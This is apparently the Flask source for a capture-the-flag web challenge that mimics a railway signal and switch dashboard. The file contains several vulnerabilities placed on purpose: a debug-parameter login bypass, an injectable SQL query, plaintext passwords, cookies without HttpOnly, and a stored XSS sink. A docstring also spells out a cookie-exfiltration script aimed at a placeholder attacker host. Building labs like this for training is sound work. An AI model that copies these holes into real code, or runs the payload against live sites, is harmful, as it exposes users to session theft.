import json
import os

from flask import (
    Flask, request, session, redirect,
    url_for, render_template, g
)
from flask_mysqldb import MySQL
from config import Config

app = Flask(__name__)
app.config.from_object(Config)
mysql = MySQL(app)

# ---------------------------------------------------------------------------
# Account store
# Passwords are placeholders — Ansible replaces these via Jinja2 template
# so the real password matches what the IVR issues from defaults.conf
# ---------------------------------------------------------------------------
ACCOUNTS = {
    "operator":   {"password": "operator123",   "role": "operator"},
    "supervisor": {"password": "supervisor123",  "role": "supervisor"},
}
SWITCHES = [
    {"id": "SW-1", "location": "Factory siding A",  "state": "STRAIGHT", "last_update":"01-06-2026 08:02:11", "status":"OK"},
    {"id": "SW-2", "location": "DB InfraGo junction","state": "STRAIGHT", "last_update":"01-06-2026 08:02:11", "status":"OK"},
    {"id": "SW-3", "location": "Depot entry",         "state": "DIVERGE", "last_update":"01-06-2026 08:02:11", "status":"OK"},
    {"id": "SW-4", "location": "Factory siding B",    "state": "IDLE", "last_update":"01-06-2026 08:02:11", "status":"IDLE"},
]
SIGNALS = [
    {"id":"SIG-A", "location": "DB InfraGo junction", "state": "HALT"},
    {"id":"SIG-B", "location": "Depot Entry", "state": "GO"},
    {"id":"SIG-C", "location": "Factory siding A", "state": "GO"},
    {"id":"SIG-D", "location": "Factory siding B", "state": "DISABLED"},
    {"id":"SIG-E", "location": "Endpoint", "state": "DISABLED"},
]
DEFAULT_SETTINGS = {
    "alert_switch":     True,
    "alert_halt":       True,
    "alert_bot":        False,
    "alert_email":      False,
    "refresh_interval": "10",
    "map_ratio":        "0.42",
    "show_sig_labels":  True,
    "timestamp_fmt":    "de",
    "api_host":         "127.0.0.1:8001",
    "bot_poll":         "30",
    "https_enforce":    False,
    "sip_host":         "0.0.0.0:5060",
    "session_timeout":  "30",
    "cookie_httponly":  False,   # intentionally off — vulnerability
    "cookie_secure":    False,   # intentionally off — vulnerability
    "debug_bypass":     True,    # intentionally on  — vulnerability
    "log_retention":    "30",
    "auto_update":      False,
}
SIGNAL_LOGS = [
    {"id": 1,  "date": "01-06-2026 08:02:11", "signal_id": "SIG-A", "location": "Main line entry",    "severity": "INFO",  "content": "State change: HALT → GO",             "raw": "SIGSTATE SIG-A 0x01 08:02:11.042"},
    {"id": 2,  "date": "01-06-2026 08:14:37", "signal_id": "SIG-D", "location": "Factory B approach", "severity": "WARN",  "content": "State change: GO → HALT",             "raw": "SIGSTATE SIG-D 0x00 08:14:37.118"},
    {"id": 3,  "date": "01-06-2026 08:14:38", "signal_id": "SW-4",  "location": "Factory siding B",   "severity": "INFO",  "content": "Switch position: NORMAL → DIVERGE",  "raw": "SWPOS SW-4 0x02 08:14:38.004"},
    {"id": 4,  "date": "01-06-2026 08:51:33", "signal_id": "SW-3",  "location": "Depot entry",        "severity": "INFO",  "content": "Switch position: NORMAL → DIVERGE",  "raw": "SWPOS SW-3 0x02 08:51:33.771"},
    {"id": 5,  "date": "01-06-2026 09:01:05", "signal_id": "SIG-B", "location": "Junction approach",  "severity": "INFO",  "content": "Heartbeat OK",                        "raw": "HBEAT SIG-B 0xFF 09:01:05.000"},
    {"id": 6,  "date": "01-06-2026 09:01:05", "signal_id": "SIG-C", "location": "Factory A approach", "severity": "INFO",  "content": "Heartbeat OK",                        "raw": "HBEAT SIG-C 0xFF 09:01:05.001"},
    {"id": 7,  "date": "01-06-2026 09:01:05", "signal_id": "SIG-E", "location": "Depot approach",     "severity": "INFO",  "content": "Heartbeat OK",                        "raw": "HBEAT SIG-E 0xFF 09:01:05.002"},
    {"id": 8,  "date": "01-06-2026 09:04:22", "signal_id": "SIG-D", "location": "Factory B approach", "severity": "ERROR", "content": "Controller timeout — no response",    "raw": "TIMEOUT SIG-D 0xEE 09:04:22.500"},
    {"id": 9,  "date": "01-06-2026 09:04:55", "signal_id": "SIG-D", "location": "Factory B approach", "severity": "INFO",  "content": "Controller reconnected",              "raw": "RECONN SIG-D 0x01 09:04:55.210"},
    {"id": 10, "date": "01-06-2026 09:14:02", "signal_id": "SW-1",  "location": "Factory siding A",   "severity": "INFO",  "content": "Switch position confirmed: NORMAL",   "raw": "SWPOS SW-1 0x01 09:14:02.033"},
    {"id": 11, "date": "01-06-2026 09:14:02", "signal_id": "SW-2",  "location": "DB InfraGo junction","severity": "INFO",  "content": "Switch position confirmed: NORMAL",   "raw": "SWPOS SW-2 0x01 09:14:02.041"},
    {"id": 12, "date": "01-06-2026 09:14:08", "signal_id": "SIG-A", "location": "Main line entry",    "severity": "WARN",  "content": "Bot cycle delayed — 28s (expected 10s)","raw": "BOTCYCLE SIG-A 0xAB 09:14:08.900"},
]

USER_FLAG = "FLAG{s3ss10n_h1j4ck_succ3ss}"

# Injected by Ansible via environment variable — placeholder for local dev
USER_FLAG = os.environ.get("USER_FLAG", "FLAG{s3ss10n_h1j4ck_succ3ss}")

# Bot token: the background supervisor bot authenticates with this header.
# Ansible sets this to a random value at provisioning time.
# Must match the token in /opt/railinfra/bot.py
BOT_TOKEN = os.environ.get("BOT_TOKEN", "dev-bot-token-changeme")


# ---------------------------------------------------------------------------
# Bot authentication hook
# ---------------------------------------------------------------------------

@app.before_request
def authenticate_bot():
    """
    Allow the supervisor bot to authenticate via a static header token.
    The bot sends:  X-Bot-Token: <BOT_TOKEN>
    Flask then sets a real session (username=supervisor, role=supervisor)
    so that document.cookie in any XSS payload returns a valid supervisor
    session cookie — which is the intended XSS exfiltration target.

    Note: SESSION_COOKIE_HTTPONLY is False (see config.py), so JS can
    read document.cookie. This is the intentional vulnerability.
    """
    token = request.headers.get("X-Bot-Token", "")
    if token and token == BOT_TOKEN:
        session["username"] = "supervisor"
        session["role"]     = "supervisor"
        session["bot"]      = True


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def get_session_user():
    """Return (username, role) or (None, None)."""
    return session.get("username"), session.get("role")


def require_auth(min_role="operator"):
    """
    Return a redirect if the session does not meet min_role, else None.
    Role hierarchy: operator(1) < supervisor(2)
    """
    rank = {"operator": 1, "supervisor": 2}
    _, role = get_session_user()
    if role is None or rank.get(role, 0) < rank.get(min_role, 0):
        return redirect(url_for("login"))
    return None


def get_cursor():
    """Return a fresh MySQL cursor (one per request via flask g)."""
    if not hasattr(g, "cursor"):
        g.cursor = mysql.connection.cursor()
    return g.cursor


@app.teardown_appcontext
def close_cursor(error):
    if hasattr(g, "cursor"):
        g.cursor.close()


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/", methods=["GET"])
def index():
    return redirect(url_for("login"))


@app.route("/login", methods=["GET", "POST"])
def login():
    error  = None
    bypass = request.args.get("debug", "").lower() == "true"

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        # ------------------------------------------------------------------
        # Path A — Debug bypass (Vulnerability 1)
        # The ?debug=true parameter skips password validation entirely.
        # Only requires a non-empty username field.
        # Hint left in /static/app.js as a developer TODO comment.
        # ------------------------------------------------------------------
        if bypass and username:
            # We still need a role for the session — look it up from the DB.
            # Use a parameterised query here (bypass is already achieved above;
            # the SQL injection rabbit hole is only on the normal login path).
            """cur = get_cursor()
            cur.execute(
                "SELECT username, role FROM accounts WHERE username = %s",
                (username,)
            )
            row = cur.fetchone()
            if row:
                session["username"] = row[0]
                session["role"]     = row[1]
                return redirect(url_for("dashboard"))
            error = "Unknown user." """
            # Hardcoded for local dev — bypasses DB lookup
            roles = {
                "operator": "operator",
                "supervisor": "supervisor",
            }
            session["username"] = username
            session["role"] = roles.get(username, "operator")
            return redirect(url_for("dashboard"))

        # ------------------------------------------------------------------
        # Path B — Normal login with intentional SQL injection (rabbit hole)
        #
        # The query is built with string formatting — deliberately injectable.
        # sqlmap will detect this and dump the `users` table, which contains
        # only dummy rows with placeholder hashes. The real accounts live in
        # the `accounts` table, which this query never touches.
        #
        # Dead-end design:
        #   users table  → dummy data only, no working credentials
        #   accounts table → operator / supervisor (parameterised, not injectable)
        #
        # The attacker wastes time here before pivoting to the debug bypass.
        # ------------------------------------------------------------------
        elif username and password:
            try:
                cur = get_cursor()
                # INTENTIONAL: f-string injection — do not fix
                query = (
                    f"SELECT username, password_hash FROM users "
                    f"WHERE username='{username}' AND password='{password}'"
                )
                cur.execute(query)
                dummy_row = cur.fetchone()

                if dummy_row:
                    # Rows exist but the hashes are placeholders — login always
                    # fails here, reinforcing the rabbit-hole dead end.
                    error = "Invalid credentials."
                else:
                    # Also check the real accounts table (parameterised).
                    cur.execute(
                        "SELECT username, role, password_hash FROM accounts "
                        "WHERE username = %s",
                        (username,)
                    )
                    account = cur.fetchone()
                    if account:
                        db_user, db_role, db_hash = account
                        # Simple plaintext comparison — intentionally weak.
                        # Ansible sets these passwords from defaults.conf so
                        # the operator password matches what the IVR issues.
                        if db_hash == password:
                            session["username"] = db_user
                            session["role"]     = db_role
                            return redirect(url_for("dashboard"))
                    error = "Invalid credentials."

            except Exception:
                # Surface a generic error; don't leak DB details in the UI.
                error = "Invalid credentials."

        else:
            error = "Username and password are required."

    return render_template("login.html", error=error)


@app.route("/dashboard", methods=["GET"])
def dashboard():
    guard = require_auth("operator")
    if guard:
        return guard

    username, role = get_session_user()
    signal_banner  = session.get("signal_banner", "Track 4B — nominal")
    bot_cycles     = session.get("bot_cycles", 847)

    return render_template(
        "dashboard.html",
        username=username,
        role=role,
        signal_banner=signal_banner,   # rendered with | safe — XSS sink
        bot_cycles=bot_cycles,
        signals=SIGNALS,
        signals_json=json.dumps(SIGNALS),
        switches=SWITCHES,
        switches_json=json.dumps(SWITCHES),
        signal_logs=SIGNAL_LOGS,
        signal_logs_json=json.dumps(SIGNAL_LOGS),
        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
    )


@app.route("/signal", methods=["POST"])
def signal():
    """
    Accepts a signal name and stores it unsanitised in the session.
    Rendered via {{ signal_banner | safe }} in dashboard.html.

    XSS chain:
      1. Attacker (operator session) submits:
             <script>fetch('http://ATTACKER/?c='+document.cookie)</script>
      2. Payload stored in session["signal_banner"]
      3. Bot (supervisor session, no HttpOnly) polls /dashboard every ~10s
      4. Bot renders the page; script fires; supervisor cookie sent to attacker
      5. Attacker swaps cookie → supervisor session → /internal-help accessible
    """
    guard = require_auth("operator")
    if guard:
        return guard

    signal_name = request.form.get("signal_name", "")
    # Vulnerability 2: no sanitisation — intentional XSS sink
    session["signal_banner"] = signal_name
    return redirect(url_for("dashboard"))


@app.route("/internal-help", methods=["GET"])
def internal_help():
    guard = require_auth("supervisor")
    if guard:
        return guard

    _, role = get_session_user()
    return render_template(
        "internal_help.html",
        role=role,
        user_flag=USER_FLAG,
        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
    )


@app.route("/signal-log", methods=["GET"])
def signal_log():
    guard = require_auth("operator")
    if guard:
        return guard

    username, role = get_session_user()
    return render_template(
        "signal_log.html",
        username=username,
        role=role,
        signal_logs=SIGNAL_LOGS,
        signal_logs_json=json.dumps(SIGNAL_LOGS),
        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
    )


@app.route("/track-map", methods=["GET"])
def track_map():
    guard = require_auth("operator")
    if guard:
        return guard

    username, role = get_session_user()
    return render_template(
        "track_map.html",
        username=username,
        role=role,
        signals=SIGNALS,
        signals_json=json.dumps(SIGNALS),
        switches=SWITCHES,
        switches_json=json.dumps(SWITCHES),
        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
    )


@app.route("/settings", methods=["GET", "POST"])
def settings():
    guard = require_auth("supervisor")
    if guard:
        return guard

    _, role = get_session_user()
    saved = False

    if request.method == "POST":
        for key in DEFAULT_SETTINGS:
            if isinstance(DEFAULT_SETTINGS[key], bool):
                session["settings_" + key] = key in request.form
            else:
                session["settings_" + key] = request.form.get(key, DEFAULT_SETTINGS[key])
        session.modified = True
        saved = True

    current = {key: session.get("settings_" + key, default)
               for key, default in DEFAULT_SETTINGS.items()}

    return render_template(
        "settings.html",
        role=role,
        settings=current,
        saved=saved,
        timestamp_fmt=current["timestamp_fmt"],
    )


@app.route("/logout", methods=["GET"])
def logout():
    session.clear()
    return redirect(url_for("login"))


# ---------------------------------------------------------------------------
# Dev entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    # Flask debug mode OFF — the vulnerability is the ?debug=true param,
    # not the Flask interactive debugger.
    app.run(host="127.0.0.1", port=5000, debug=False)
